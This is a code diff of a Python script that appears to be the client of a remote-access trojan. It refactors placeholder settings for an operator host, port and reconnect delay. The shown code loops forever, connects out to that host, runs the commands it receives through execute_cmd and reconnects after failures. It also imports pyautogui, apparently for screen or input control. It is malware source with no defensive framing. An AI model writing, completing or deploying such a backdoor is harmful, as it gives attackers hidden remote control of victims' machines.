@@ -5,23 +5,20 @@ import socket
 import pyautogui
 import subprocess
 
-#convert user reconnection_time into minute & int
-reconnection_time = "<TIME>"
-int_time = int(reconnection_time)
-min_time = int_time * 60
-reconnection_time = min_time
-
 # Flags
 SCCS = "<SCCS>"
 FILE = "<FILE>"
 ERRO = "<ERRO>"
 
+HOST = "<HOST>"
+PORT = <PORT>
+TIME = <TIME> * 60
 
 while True:
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
     try:
-        sock.connect(("<HOST>", <PORT>))
+        sock.connect((HOST, PORT))
 
         ''' FUNCTIONS '''
 
@@ -78,4 +75,4 @@ while True:
                     execute_cmd(response)
 
     except:
-        time.sleep(reconnection_time)
+        time.sleep(TIME)
